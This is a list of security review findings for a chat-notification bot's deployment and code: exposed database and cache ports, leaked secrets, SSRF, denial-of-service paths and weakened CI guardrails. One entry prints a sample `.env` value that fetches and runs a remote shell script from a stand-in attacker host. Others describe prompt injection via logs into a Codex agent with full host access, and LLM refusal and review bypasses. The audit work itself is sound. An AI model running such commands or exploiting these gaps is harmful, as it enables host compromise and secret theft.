title: Valkey exposed on Tailnet with default password
description: This commit changes the production deployment from loopback-only Valkey exposure to publishing port 6379 on `${VALKEY_PORT_BIND_IP:-100.100.1.3}` by default. It also adds `CACHE_PASSWORD=change_me_cache_password` to `.env.example`; if an operator follows the documented `cp .env.example .env` flow and misses this value, the known placeholder satisfies `${CACHE_PASSWORD:?set CACHE_PASSWORD in .env}` and is used as Valkey's `--requirepass`. Any attacker with network reachability to the Tailnet-bound address can authenticate to Valkey using the public placeholder and run Redis/Valkey commands. Valkey backs queues, rate limits, caches, and the admin dashboard session store, so compromise enables denial of service, cache/queue poisoning, and potentially fraudulent notification dispatch. Even without the placeholder, making remote Valkey exposure the default violates the stated assumption that Valkey is not reachable outside the local/internal deployment unless explicitly configured.

title: Postgres exposed by host-networked production compose
description: The production compose file now runs the Postgres container with `network_mode: host` instead of attaching it only to `hololive-net`. Because the Postgres image listens on its configured TCP port for container clients, host networking makes that listener bind directly in the host network namespace on port 5433 rather than keeping it isolated behind Docker's bridge network. The application services and migration job were also changed to reach Postgres via `host.docker.internal`, confirming that the database is intended to be reachable through the host gateway. This violates the stated deployment assumption that Postgres is not publicly reachable. If the host has a public or LAN-facing interface without firewall rules blocking 5433, attackers can directly reach the database service, perform online password attacks, exploit any Postgres service vulnerabilities, or obtain full database read/write access if credentials are weak, reused, leaked, or left as example placeholders. The safer design is to keep Postgres on the internal Compose network, or if host routing is required, explicitly bind/listen only on loopback with host firewall enforcement and retain TLS requirements where traffic is not strictly local.

title: CI exposes module token to pull request code
description: The workflow runs on pull_request and checks out the PR code. It then checks out private repositories using secrets.MODULES_TOKEN and writes the same token into the global git config. After that, it sources scripts/ci/go-workspace-modules.sh from the checked-out repository and later runs go test. A malicious PR that is allowed to run with repository secrets, such as a same-repository branch from an untrusted collaborator, can modify the sourced script or tests to read ~/.gitconfig or checkout credentials and exfiltrate MODULES_TOKEN. Fork pull_request workflows normally do not receive repository secrets, so this is not generally exploitable by arbitrary fork PRs, but it is still an introduced CI secret-exposure flaw if any less-trusted actor can open same-repo PRs or otherwise run PR code with secrets.

title: DB passwords can leak via pg_stat_statements
description: The new Postgres command preloads pg_stat_statements and the new init script creates the extension, but the configuration does not set pg_stat_statements.track_utility=off. pg_stat_statements tracks utility statements by default, and utility statements are not safely parameterized/normalized like normal DML. The existing migration bootstrap runs after the final Postgres server is healthy and always executes dynamic CREATE/ALTER ROLE commands containing the scraper password as a SQL literal. In the default compose configuration, HOLOLIVE_SCRAPER_PASSWORD is empty and the script falls back to POSTGRES_ADMIN_PASSWORD/DB_PASSWORD, so the captured ALTER ROLE statement can contain the admin database password. Any role or monitoring component with permission to view all pg_stat_statements query text, such as pg_read_all_stats or a superuser-backed metrics endpoint, could recover the password from statement statistics and escalate to the database admin role. A safer configuration would disable utility tracking, reset pg_stat_statements after password bootstrap, avoid plaintext password DDL after stats are enabled, and require distinct per-role passwords.

title: Self-heal watchdog grants Codex full host control
description: This commit introduces an optional systemd watchdog that runs the self-heal script with `--apply`. If Valkey remains unhealthy, the script builds an LLM prompt containing recent container logs and then invokes Codex with `danger-full-access` from the repository directory. The comments explicitly state there is no whitelist and that Codex is delegated recovery decisions. Because the Codex process runs on the production host with Docker access, any prompt injection through diagnostic input, compromised Codex CLI/model/account, or unsafe model action can execute arbitrary host/Docker commands, read container environment variables and secrets, stop or modify services, or persist changes. The post-check only detects some damage after execution and does not prevent it. This is especially concerning because the prompt instructs Codex to inspect Docker state/logs, which can expose secrets such as container environment variables to the external AI service and to the JSONL journal.

title: HTTP/3 handshakes reload and parse TLS key files
description: The commit replaces the previously loaded static certificate with a GetCertificate callback. That callback takes a mutex and calls loadTLSCertificatePair on every handshake before checking whether the fingerprint changed. loadTLSCertificatePair reads both PEM files and runs tls.X509KeyPair, which parses the private key, even when the files are unchanged. Because GetCertificate is reachable during unauthenticated HTTP/3/QUIC handshakes and the work is serialized under a single mutex, an attacker who can connect to the H3 listener can repeatedly initiate handshakes to force disk reads/private-key parsing and stall legitimate handshakes. The implementation should avoid parsing the key on every handshake; for example, check file metadata/fingerprints cheaply, use fsnotify or a periodic reload interval, and publish the current certificate through an atomic value without holding a global mutex across file IO and parsing.

title: Calendar photo rendering enables SSRF/DoS
description: The commit adds a chat-triggered calendar image renderer. Each invocation queries calendar entries and then fetches every distinct member Photo URL before drawing the PNG. Those URLs are taken from stored member metadata and are not constrained to trusted thumbnail hosts or HTTPS, and the default Go HTTP client follows redirects. The code also decodes untrusted PNG/JPEG data after only a byte-size read limit, without checking image dimensions first, and the fetches are not tied to the command context. If an attacker can influence a stored photo URL through an untrusted upstream/member metadata path, or if a trusted photo endpoint redirects maliciously, a chat command can make the bot issue server-side GET requests to internal services/cloud metadata or decode resource-expensive images. Repeated calendar commands can also tie up async workers on sequential 5-second photo fetches. Mitigations should include an allowlist for expected thumbnail hosts, HTTPS-only enforcement, redirect validation/private IP blocking, context-aware requests, response status/content-type checks, DecodeConfig dimension limits before Decode, caching, and per-command fetch limits.

title: Missing BotPool fallback can disable async command workers
description: The changed loader now copies Workers and QueueSize directly from profile.BotPool. Existing worker-profile JSON used by the shared test fixture contains a receive section but no bot_pool section, so such profiles can produce a WorkerPoolConfig with zero values. Config validation does not reject that state, and bootstrap passes the values directly into workerpool.NewQueued. Async chat commands then call SubmitWait on that pool from the webhook handling path; with a zero-capacity/non-running pool this can block webhook workers or otherwise leave async command handling unavailable. A chat user able to send common async commands such as help/live/upcoming can exploit this deployment state to exhaust webhook workers and deny bot service. Before this commit, the bot pool used profile.Receive.Workers/QueueSize, which are present in the legacy/profile fixture, so the zero BotPool path was not introduced.

title: Admin API now mounts bot TLS private key directory
description: The admin API only needs read access to the Iris H3 CA bundle, /run/hololive-bot/certs/iris-ca.pem. Instead, the service was switched from *go-basic-volumes to *go-volumes, which mounts the entire /run/hololive-bot/certs directory into hololive-admin-api. docker-compose.prod.yml also stores the hololive-bot H3 server certificate and private key in that same directory. This unnecessarily expands the blast radius of any hololive-admin-api compromise or arbitrary file-read bug: an attacker with code execution or file-read capability in that container could read hololive-h3.key and use it to impersonate the bot H3 endpoint or undermine TLS identity for clients that trust that certificate. A safer fix would mount only iris-ca.pem into the admin-api container, or split CA bundles and private keys into separate host directories and mount only the CA directory where needed.

title: Blocking async command enqueue enables webhook DoS
description: Async bot commands are triggered from webhook message handling. This commit switches command dispatch to `QueuedPool.SubmitWait`, which the updated tests explicitly expect to block while the worker queue is full. The production pool has only 10 workers and a queue of 100. Once those are saturated by slow async commands, additional webhook handler goroutines block inside `executeCommandAsync` waiting for capacity. Because the blocking wait is not bounded by the request context or enqueue timeout, an attacker who can send commands in an allowed chat can keep webhook workers occupied and degrade or deny bot processing. The previous rejection/backpressure path remains, but it is no longer used for normal queue-full pressure.

title: Unpruned shared-go context can poison Docker builds
description: The Osaka deployment path is designed around an explicit rsync file allowlist and the youtube-producer Dockerfile previously pruned copied sources against that allowlist. This commit changes shared-go from a filtered primary-context path to the named `shared_go_workspace` context at `/workspace/shared-go`, but the subsequent `find ... rm` pruning step only covers `hololive/hololive-shared` and `hololive/hololive-youtube-producer`, not `/workspace/shared-go`. The compose wrapper also now automatically selects a sibling `../shared-go` directory. Because rsync does not delete unlisted files from that sibling directory, any stale or attacker-planted Go files in imported shared-go packages can persist and be included in future Docker builds even though they are not in `osaka-active-active-rsync-files.txt`. If remote BuildKit cache export is enabled with `mode=max`, the unpruned builder layer may also expose non-final shared-go files to the cache registry.

title: Server-side CI and security scans removed
description: This commit removes the repository's server-side GitHub Actions checks for PRs and trusted pushes, including govulncheck-based Go dependency scanning, Rust cargo-deny auditing, Rust tests/lints, frontend tests/lints/builds, and architecture/integration gates. The replacement is a local pre-push script, which only runs if a developer has the hook installed and does not bypass it with --no-verify. It also explicitly defaults RUN_DEPENDENCY_HYGIENE to false, so the local wrapper disables the vulnerability/dependency audit unless the developer opts in. This is not a direct runtime exploit in the deployed bot, but it is a security control regression that makes malicious or vulnerable code and dependencies much easier to merge without automated detection.

title: Hash conflicts silently drop PG-first alarm deliveries
description: Dispatch event keys intentionally exclude mutable payload fields such as the stream title, while the stored event payload includes the full stream object. If an event is already present in the outbox and a later notification for the same event key has a different payload hash, the new code logs the conflict, adds the key to conflictKeys, filters all associated deliveries, and commits successfully. In PG-first mode, publishPGFirstBatch returns nil on this result, and publishBatchAndMark ignores InsertedDeliveries/HashConflictEvents on success and marks every prepared item as notified. The skipped delivery is therefore not inserted into Postgres, no wakeup is sent for it, its claims are not released, and the notification is marked as already sent. Because external stream metadata is untrusted and mutable, an attacker who can influence stream metadata can cause missed notifications for affected rooms.

title: Admin dashboard exposed on Tailscale interface
description: The production Compose file previously bound admin-dashboard only to 127.0.0.1:30190. This commit adds a host binding on 100.100.1.3:30190. Because the dashboard contains authenticated admin APIs that can restart/stop/start managed Docker containers and proxy privileged Hololive admin actions, publishing it on the Tailscale interface expands the attack surface from local-only/reverse-proxy-only access to any Tailscale peer or compromised tailnet node that is allowed to connect to that address. The in-application admin authentication and CSRF checks reduce the severity, but the change can bypass reverse-proxy-only controls such as TLS termination policy, source allowlists, SSO, request filtering, and centralized rate limits. If this exposure is intentional, it should be paired with explicit Tailscale ACLs or host firewall rules limiting source peers to the Caddy reverse proxy node, and the bind address should be configurable rather than unconditionally published.

title: Thread-scoped reply IDs can suppress bot responses
description: The new request-id generation carries both a per-inbound-message reply identity and the Iris ThreadID in context, but commandReplyIdentity() prefers the ThreadID whenever it is present. SendMessage() then derives ClientRequestID from room, that identity, and the rendered reply text. As a result, two different inbound messages in the same Kakao/Iris thread with different MessageID/ChatLogID values but the same rendered response produce the same ClientRequestID. Since ClientRequestID is used as the Iris idempotency key, common repeated responses such as help text, validation errors, or no-results messages can be treated as duplicates and suppressed. A malicious user in an allowed chat/thread can intentionally trigger a common command once and cause later identical responses in that same thread to be deduplicated until Iris's idempotency window expires. The ThreadID should be used for reply threading only; the idempotency identity should include a per-inbound-message stable ID, or combine ThreadID and MessageID/ChatLogID/SourceLogID.

title: CI artifact gate misses .env.osaka secrets
description: The commit adds a policy saying local env files and key material must not be tracked, and adds `check-tracked-local-artifacts.sh` patterns intended to enforce that. However, the env-file patterns only match `.env`, `.env.local`, and `.env.*.local` at the repository root. They do not match `.env.osaka`, which existing deployment documentation identifies as an Osaka deployment env file containing `CACHE_PASSWORD` shared with the central host. As a result, a real `.env.osaka` file could be force-added or accidentally added and still pass this new CI gate. The check should either mirror the repository's deployment env-file names explicitly, or use a broader pattern such as `(^|/)\.env($|\.)` with explicit exceptions for safe examples like `.env.example` and `.env.osaka.example`.

title: Producer containers still inherit Iris secrets
description: The commit attempts to make alarm-worker the sole notification egress owner by removing *iris-env from stream-ingester, youtube-scraper, and llm-scheduler and adding a CI gate that checks those service blocks for explicit Iris variables. However, every service using the *app-service anchor still receives ${COMPOSE_ENV_FILE:-./.env} via env_file. The example env file contains IRIS_BASE_URL, IRIS_WEBHOOK_TOKEN, and IRIS_BOT_TOKEN, so in a normal deployment these producer containers still get the same Iris credentials even though the new gate reports that they have no Iris egress env. A compromise of any producer container can therefore read the bot token from the environment and use it to send unauthorized Iris/Kakao notifications, defeating the intended egress-ownership boundary.

title: Egress ownership bypassed by inherited env file
description: The new deployment model makes alarm-worker the notification egress owner and labels stream-ingester, youtube-scraper, and llm-scheduler as producer/non-egress services. However, every service extending x-app-service still receives `${COMPOSE_ENV_FILE:-./.env}` via `env_file`. The example env file and compose anchors show that Iris send/webhook secrets are expected to live in that global file. As a result, removing `*iris-env` from those service blocks does not actually remove the Iris secrets from their runtime environments. A compromise of any producer container can still read the Iris bot/webhook tokens and use them to send notifications or spoof Iris-authenticated traffic, defeating the ownership boundary introduced by this commit. The new CI gate also only scans each service block for explicit Iris entries and misses inherited env_file secrets, so it will pass despite the leak.

title: Default Iris URL file can redirect bot traffic
description: docker-compose.prod.yml now sets IRIS_BASE_URL_FILE to /app/runtime-config/iris_base_url by default. The Iris runtime client gives this file precedence over the configured IRIS_BASE_URL, and only validates that the file contains an http/https URL with a compatible scheme, not that it points to an expected Iris host. As a result, if an attacker or compromised local/supply-chain process can plant or modify ./runtime-config/iris_base_url on the host, outbound Iris traffic can be redirected to an attacker-controlled endpoint without explicitly opting into file-based configuration. Because the Iris client is built with IRIS_BOT_TOKEN, this can expose the bot token and message contents and can disrupt or spoof outbound delivery. The mount is read-only inside the containers, but that does not protect against host-side file planting before container start or by another host-level process.

title: Default Iris URL file can hijack Iris traffic
description: docker-compose.prod.yml now sets IRIS_BASE_URL_FILE to /app/runtime-config/iris_base_url whenever the variable is unset or empty. The Iris runtime client reads IRIS_BASE_URL_FILE directly from the environment and, if the file exists and contains a syntactically valid http(s) URL, returns that value before falling back to the configured IRIS_BASE_URL. The same client is then constructed with the Iris bot token for the selected base URL. Since runtime-config is mounted from a host directory and documented as non-secret runtime configuration, this makes a lower-trust or stale local file capable of overriding the OpenBao/env-provided Iris endpoint. A malicious value such as https://attacker.example would receive Iris API requests, message contents, and the bot token, enabling credential disclosure and notification/message hijacking. If the file is missing or invalid the code falls back, but the dangerous case is a valid unexpected file silently taking precedence.

title: Osaka scrapers mount shared certificate private-key directory
description: The commit adds a read-only bind mount of /run/hololive-bot/certs into the stream-ingester and youtube-scraper containers. The production compose file shows this directory is also used to store the hololive H3 server private key, while the Iris client configuration only requires the CA certificate at /run/hololive-bot/certs/iris-ca.pem. Mounting the whole directory unnecessarily exposes the service TLS private key to scraper/ingester processes that handle untrusted external API data. If either container is compromised or gains an arbitrary file-read primitive, the attacker can steal the private key and potentially impersonate or intercept the internal H3 service. The safer pattern is to mount only the required CA certificate file, or to split public CA material and private keys into separate host directories with per-service mounts.

title: PG outbox batch failure can suppress alarm dispatches
description: The scheduler previously processed notifications independently, but this commit accumulates all successfully claimed notifications and publishes them with one PublishBatch call. The new PG outbox path inserts every envelope in a single transaction and returns immediately on any insert error. Because event_key and dedupe_key are built from external stream metadata and are only constrained at the database layer, a malicious or malformed third-party API response with an overlong stream/event identifier can violate the new CHECK constraints. In pg_first mode the publisher then returns an error without falling back to Valkey, and Notifier marks the entire prepared set as failed and releases all claims. This creates an availability/integrity issue: one attacker-influenced bad alarm event can repeatedly prevent unrelated valid alarm notifications in the same batch from being enqueued.

title: Unbounded Prometheus minute label can exhaust worker memory
description: The new YouTube decision metrics use `minutesUntil` as a Prometheus label value. For normal target-minute crossings this is usually a small configured set, but the schedule-change path sets `minutesUntil` to `currentMinutesUntil`, which is derived from `stream.StartScheduled` returned by the external Holodex/scraper data path. A malicious or compromised upstream response could repeatedly change scheduled times to produce many distinct minute values. `CounterVec.WithLabelValues` stores each distinct label set for the lifetime of the process, so this can cause unbounded in-memory time-series growth even if `/metrics` is never scraped. The value should be bucketed to a finite set, omitted, or replaced with a low-cardinality category for non-target schedule-change decisions.

title: Unbounded Prometheus label cardinality in alarm metrics
description: The new YouTube upcoming decision metric includes a `minute` label and formats any non-negative integer directly as a label value. For normal target crossings this is bounded by configured target minutes, but when no target was crossed and a schedule change is detected, `minutesUntil` is set to `currentMinutesUntil`, derived from `stream.StartScheduled`. Those stream schedules originate from external Holodex/YouTube data, which the threat model treats as untrusted. A malicious or compromised upstream source, or an attacker able to influence schedules for tracked channels, could repeatedly vary future scheduled times and cause the worker to create a new Prometheus time series for each distinct minute value. These series are retained by the Prometheus client registry for the process lifetime, so this can grow memory without relying on access to the protected `/metrics` endpoint and can eventually degrade or crash the alarm worker.

title: Forwarded header trust can bypass login rate limiting
description: The new TRUST_FORWARDED_HEADERS path uses the first X-Forwarded-For value, or X-Real-IP, as the rate-limit key for /admin/api/auth/login. If TRUST_FORWARDED_HEADERS is enabled and an attacker can send or influence these headers, they can vary the header value on each failed login attempt and avoid accumulating failures under a single key. This weakens the admin login brute-force protection. In common proxy deployments this is still risky unless the proxy strips inbound X-Forwarded-For and supplies a trusted value, because many proxies append to an existing attacker-supplied X-Forwarded-For chain while this code trusts the first entry.

title: Per-room schedule checks trigger SCAN amplification DoS path
description: In `buildUpcomingNotifications`, schedule-change detection is now executed for every upcoming stream before deciding whether the current minute is a target notification minute. That detection loops over all subscriber rooms and calls `DetectNotificationScheduleChange` per room. In the dedup service, the logical schedule check falls through to legacy detection, which performs `ScanKeys` with SCAN cursor iteration until completion. This creates a multiplicative load path (`channels * streams * rooms * full scan passes`) on each checker run. An attacker who can inflate subscriptions (or otherwise increase room/stream cardinality) can exploit this to degrade or exhaust Valkey/CPU, impacting availability of alarm delivery and potentially other services sharing Valkey.

title: LLM fallback can bypass Responses safety refusals
description: The new `extractResponsesOutputText` helper converts any Responses API response without `OutputText()` into `errOpenAIEmptyOutput`, even when `describeResponsesOutput` detected a `refusal` content item. `shouldFallbackToChat` then treats `errOpenAIEmptyOutput` as retryable, and `generateJSONWithTransportFallback` sends the same untrusted prompts to Chat Completions. Because LLM prompts are built from external/untrusted event and member-news inputs, a malicious or compromised upstream content source could cause the primary Responses API path to refuse and still get a second chance through a different prompting/API path. The likely impact is integrity of generated notifications, such as unsafe, misleading, or phishing-like outbound content, rather than code execution or admin compromise. Refusal/incomplete-safety cases should be distinguished from benign empty output and should not trigger fallback.

title: Login logs allow X-Forwarded-For audit log injection
description: handle_login now copies the client-controlled X-Forwarded-For header into the forwarded_for log field for rate-limited, failed, and successful login attempts. The custom LegacyLogFormat does not safely encode field values: it appends string values directly and strips Debug quotes from non-string values. An unauthenticated remote attacker can send a header such as `X-Forwarded-For: 203.0.113.7 username=admin status=ok` and cause the log line to contain `forwarded_for=203.0.113.7 username=admin status=ok`. Although HTTP header parsing prevents CRLF newline injection, this still lets attackers pollute structured/audit logs with forged fields and can mislead incident response or automated log parsers. The header should be omitted unless supplied by a trusted proxy, parsed/validated as IP addresses, or emitted with proper JSON/logfmt escaping.

title: Production Postgres TLS enforcement can be bypassed
description: Production configuration previously rejected PostgreSQL sslmode values that do not require TLS. This commit adds an early return when POSTGRES_SSLMODE_ALLOW_INSECURE is true, so APP_ENV=production with POSTGRES_SSLMODE=disable, allow, or prefer is accepted. The configured sslmode is then placed directly into the PostgreSQL DSN, so a production deployment using the override can send database credentials, session data, templates, ACLs, alarms, and admin state over an unauthenticated or plaintext database connection. An attacker with a position on the container/host database network path could sniff credentials and data or tamper with database traffic. The flag is operator-controlled, so this is not a standalone remote authentication bypass, but it is a security regression from the prior hard fail in production.

title: User-created alarms can make stream ingester fail to start
description: The new startup path builds poller registrations from distinct alarm channel IDs, computes expected poller RPM as channel_count * 60 / interval for every registered poller, and now returns an error if that RPM exceeds the scraper budget. With the new defaults, each notification channel contributes about 1.5 RPM: videos 0.067, shorts 0.667, community 0.667, and live 0.1. The budget is 20 RPM, so roughly 14 distinct notification channels are enough to fail startup, before counting stats channels. Alarm channels are loaded from the alarms table and ordinary bot alarm-add commands can add distinct member channels for a room. Therefore a user who can send commands in an ACL-allowed room can create enough legitimate alarm subscriptions to persist a denial-of-service condition that prevents stream-ingester from booting after a restart/deploy. This check should not be fatal based on user-controlled alarm state unless alarm creation enforces a matching quota; alternatively the ingester should degrade gracefully, shed excess targets, or make the budget limit operator-controlled with safe handling.

title: Inline shorts resolver can repeatedly exhaust poller workers
description: When `SCRAPER_PUBLISHED_AT_RESOLVER_ENABLED=false`, production wiring enables the new inline fallback. For each newly detected short lacking `PublishedAt`, the shorts poller synchronously calls `ResolveVideoPublishedAt` with a 10 second timeout. If resolution fails or returns no published_at, the code preserves the previous watermark so the same unresolved short remains eligible on the next poll. The inline path does not mark `PublishedAtRetryAfter`, does not apply the resolver's `MaxResolvePerRun`/`MaxRunDuration` controls, and performs the resolution sequentially for every new short. A malicious or unreliable upstream YouTube response that omits published_at or stalls/errors watch-page resolution can therefore cause repeated 10-second waits per short on every shorts poll, tying up the limited poller worker pool and delaying other notification ingestion. The previous background resolver path had explicit per-run limits and failure backoff; the new inline path bypasses those safeguards.

title: Review bundle script can leak local secrets
description: The commit adds scripts/review/export-source-bundle.sh and documents it as the standard way to create review/audit source bundles. The tar command excludes VCS files, build artifacts, logs, and agent directories, but it does not exclude .env/.env.* files or runtime data/backups. In this deployment, operators are expected to copy .env.example to .env and fill it with DB passwords, API_SECRET_KEY, Iris tokens, API keys, OAuth secrets, and encryption keys. If an operator runs the new script from a normal deployment checkout and sends the resulting archive to reviewers or uploads it as an artifact, those secrets and possibly local data/backups are included. I verified this behavior by creating a temporary .env.audit-test file and confirming it appears in the generated tarball.

title: Bot API exposed on non-loopback interface
description: The commit's healthcheck change from localhost to 127.0.0.1 is benign, but the same commit also changes the hololive-bot production port publishing from a configurable localhost-default binding to two fixed bindings, including 100.100.1.3:30001. That address is not loopback, so on hosts where it exists, any peer that can route to that interface can reach the bot's HTTP server. This violates the deployment assumption that runtime services are bound only to loopback or internal Docker networks. The exposed service includes public health/readiness, public stream APIs, unauthenticated /api/auth registration/login/reset endpoints, the Iris webhook endpoint, and API-key-protected admin/internal endpoints. API-key protection still limits direct admin compromise, but the change broadens access to unauthenticated endpoints, enables remote probing/brute-force/registration DoS from that network, exposes service metadata, and increases the impact of any leaked API or webhook token. It also removes the previous HOLOLIVE_BOT_PORT_BIND_IP override that let operators keep the service loopback-only.

title: Login lockout cleanup removes active bans early
description: The rate limiter records a 15-minute lockout by setting locked_until after 5 failures, but the periodic cleanup task removes any entry whose first_attempt is older than the 5-minute window, even when locked_until is still in the future. Because first_attempt is not reset when the lockout begins, an attacker can have an active lockout removed after the original 5-minute window expires rather than after the 15-minute lockout. In the worst case, if the fifth failure happens near the end of the window, cleanup may remove the lockout almost immediately. This weakens brute-force protection for the admin login. I did not find this Rust limiter wired into a login route in the current backend-rs skeleton, but the introduced security component itself is flawed when start_cleanup_task is used.

title: Settlement migration leaks Kakao room and user identifiers
description: The commit introduces a database migration that creates settlement tables and then seeds specific Kakao chat room IDs, Kakao user IDs, and member display/real names. Because migrations are source-controlled and commonly distributed with deployments, this exposes chat identifiers and membership/payment-settlement relationships outside the database access boundary. These identifiers are sensitive in this threat model: they identify rooms and users and could aid targeted harassment, social engineering, or spoofed webhook attempts if another authentication control is later bypassed or leaked. Seed data for production/test rooms should be removed from migrations or replaced with non-sensitive fixtures; real mappings should be provisioned through a protected admin path or environment-specific private seed.

title: Production Postgres TLS validation can be bypassed
description: Production configuration previously rejected PostgreSQL sslmode values that could result in plaintext or opportunistic database connections. This commit adds an early return in validatePostgresSSLMode when POSTGRES_SSLMODE_ALLOW_INSECURE is truthy, before the production-only rejection of disable/allow/prefer. Because the shared config is used by the bot, admin API config, and LLM scheduler config, a deployment can now run in APP_ENV=production with POSTGRES_SSLMODE=disable and still pass validation. The selected sslmode is later placed directly into the PostgreSQL DSN, so the bypass can disable transport encryption for database traffic. This is not directly exploitable from the public HTTP surface by itself; exploitation requires the insecure override to be present and an attacker able to observe or manipulate traffic on the service-to-Postgres path. However, it weakens a documented production security guard and can expose sensitive database contents or allow tampering via MITM in an affected deployment.

title: Remote build cache can publish secret-bearing layers
description: The commit adds --remote-cache, which merges docker-compose.remote-cache.yml into production builds. That file uses registry cache_to entries with mode=max for each service. BuildKit mode=max exports intermediate build-stage layers, not just final image layers. The existing Dockerfiles copy entire source directories such as hololive/hololive-kakao-bot-go into builder stages, while the Docker ignore file does not mirror the repository's gitignore secret exclusions such as .env, credentials.json, token.json, *.key, *.pem, or hololive/hololive-kakao-bot-go/config.json. As a result, an operator who has local, gitignored secrets in copied service directories and runs ./build-all.sh --remote-cache may push cache layers containing those secrets to REMOTE_CACHE_PREFIX. If that registry/package is public or otherwise readable by an attacker, the attacker can pull and inspect the cache blobs. The risk is opt-in and deployment-time rather than a remote runtime vulnerability, but it can disclose high-value API tokens and credentials.

title: Unsafe .env shell sourcing in start-bot.sh
description: Before this commit, start-bot.sh only inspected .env with grep/cut. The new readiness logic sources ./.env using the shell dot command. Dotenv files are configuration data and are also parsed by the Go process via godotenv; treating them as shell scripts is unsafe. Any command, command substitution, or shell metacharacter in .env will be evaluated when an operator runs start-bot.sh or scripts that call it. For example, a value such as CORE_MEMBER_HASH_SOFT_TIMEOUT_SECONDS=$(curl attacker/sh|sh) would execute during startup. This also creates an availability regression because the repository's documented .env.example contains an unquoted value with a space, KAKAO_ROOMS=홀로라이브 알림방; when shell-sourced under set -e, that is parsed as an environment assignment followed by an attempted command named 알림방, causing the startup script to exit.

title: Incremental Twitch sync leaves stale login mappings
description: Before this commit, AddAlarm, RemoveAlarm, and ClearRoomAlarms called SyncPlatformMappings, which deleted and rebuilt the complete Twitch login hash from the current channel registry and member data. The new incremental path adds alarm:twitch_channel_logins as a reverse index and only deletes a stale forward entry when that reverse index contains the current login. On upgrade, existing Valkey data can contain alarm:twitch_logins entries without any alarm:twitch_channel_logins entries. In that state, removing a channel or changing/re-adding a channel with a different Twitch login will not delete the old alarm:twitch_logins field. If subscribers still exist for the YouTube channel, the Twitch checker can continue treating the stale Twitch login as belonging to that member, allowing an old or attacker-controlled Twitch account to trigger misleading bot notifications for subscribed rooms. The same incremental design also fails to promote an ignored duplicate login after the previously kept channel is removed until a full SyncPlatformMappings run occurs.

title: Single-event summaries bypass LLM review
description: This change adds shouldRunConsensusReview and shouldRunFinalOutputReview gates that return false when the LLM response contains exactly one highlight and no ongoing or discovered events. Before this commit, deployments with a configured reviewer ran the consensus reviewer for every summary when consensus was enabled, and also ran the final output review whenever a reviewer was present. The skipped reviewer stage is the component that checks date/member/link consistency against input events. Major-event summaries are generated from untrusted event/search data and the assembled message writes the LLM-provided highlight link directly into the outbound notification. As a result, a prompt-injected or otherwise manipulated single-event input can bypass the configured review/adjudication path and persist in the 24-hour summary cache, increasing the risk of trusted bot notifications carrying fabricated content or phishing links. This does not expose secrets or bypass authentication, but it weakens a defense-in-depth control for content integrity.

title: Unbounded Chzzk pagination can exhaust workers
description: GetLivesByChannelIDs builds a target set and then repeatedly calls GetLives until every target is found or the Chzzk response has an empty next cursor. The loop does not cap the number of pages and does not track previously seen cursors. Because Chzzk API responses are external/untrusted, a cyclic or never-ending next cursor can cause an infinite request loop when the caller provides a context without a deadline, and can still consume the full webhook worker timeout when invoked through chat commands. Even with normal pagination, a request for a non-live target may scan every live page on Chzzk, creating request amplification and quota/worker exhaustion when users repeatedly trigger the live command.

title: Unbounded Loki streaming can exhaust local disk
description: The added stream.sh helper starts persistent logcli tail pipelines for multiple services and appends their output directly to logs/{service}.log. Unlike the existing dump helper, it does not rotate, truncate, cap, or expire these files. Because service logs include attacker-influenced chat command content, a chat/webhook attacker who can generate high-volume messages can cause the operator host running this daemon to consume disk until services or other host processes fail. The risk depends on the helper being run on a production/admin host with shared or important storage, but the commit introduces a persistent unbounded write path.

title: Postgres runs on host network, exposing DB to host interfaces
description: The production compose file configures the Postgres service with `network_mode: host`. Official Postgres images listen on all interfaces by default, so host networking exposes the database port directly on the host without any `127.0.0.1` binding. This breaks the stated isolation boundary and allows anyone with network access to the host to connect and attempt credential attacks or exploit database vulnerabilities, leading to potential data compromise.

title: Circuit breaker can be reset during open transition
description: The commit replaces mutex-based Chzzk/Holodex circuit breakers with util.Breaker. In RecordFailure(), the breaker first changes open from false to true and only then stores openedAt. During that small window, another goroutine can call Allow(), observe open=true, load the initial zero time.Time from openedAt, and conclude that resetTimeout has already elapsed. It then CASes open back to false and resets failures, allowing requests through immediately after the breaker was supposed to open. This weakens the circuit breaker under concurrent failure/load conditions and can allow repeated outbound calls to failing/rate-limited external APIs instead of shedding load.

title: Unauthenticated readiness endpoint leaks bot diagnostics
description: The bot router now installs a custom readiness responder that returns `workerProfile` metadata and `irisWebhookReceive` runtime counters, including configured worker count, queue size, pending requests, in-flight requests, rejection counts, queue-full counts, and handler timeout counts. In the shared runtime router, `/ready` is registered as a public route, while only `/metrics` is placed behind `APIKeyAuthMiddleware`. As a result, any client able to reach the bot service can poll `/ready` without credentials and learn operational capacity and current queue pressure. This is not a direct compromise of secrets or admin control, but it is an introduced information leak that can help an attacker fingerprint deployment configuration and time or tune flooding attempts against the webhook pipeline.

title: Operational docs disclose internal Osaka service topology
description: Several newly added documentation files record live operational details for the Osaka deployment. They do not appear to include actual API keys, passwords, or tokens, but they do disclose the deployment hostname, Tailscale/private service address, Valkey and Postgres ports, the Postgres database/user used for runtime checks, container names, and the path of the production env file. If this repository is accessible to untrusted users, this information can materially help an attacker map the environment and target follow-on attacks against SSH, Valkey/Postgres, or the admin/API services. The detailed evidence should be moved to restricted operational storage or redacted before being committed.

title: Admin Dashboard Dockerfile Exempted From Guardrail
description: The changed guardrail filters out the exact path admin-dashboard/Dockerfile before deciding whether admin-dashboard files were modified. This makes any change to that Dockerfile pass the no-admin-touch check, including security-relevant changes such as changing the runtime user, base image, build steps, healthcheck behavior, or copied artifacts. The accompanying regression test only verifies that one benign healthcheck COPY-line transition is allowed, but the implementation grants a blanket exception for the entire Dockerfile.

title: Admin Dockerfile guardrail can be bypassed
description: The refactor guardrail is intended to prevent refactor changes from touching the security-sensitive admin-dashboard scope. This commit adds an exception by filtering out every exact admin-dashboard/Dockerfile path before checking whether admin-dashboard files changed. That is broader than the stated intent of allowing only a healthcheck source transition: any Dockerfile edit, deletion, rename involving that path, base-image change, USER change, ENTRYPOINT change, or added build/runtime command is now invisible to this guardrail. The added regression test only verifies that one benign healthcheck COPY change passes; it does not verify that unrelated Dockerfile edits still fail. Because docker-compose.prod builds the production admin-dashboard image from admin-dashboard/Dockerfile, this weakens a CI defense-in-depth control around the admin dashboard container. It is not a direct runtime exploit and still requires a malicious or mistaken code change to be merged/deployed.

title: Thread IDs reused as Iris idempotency keys
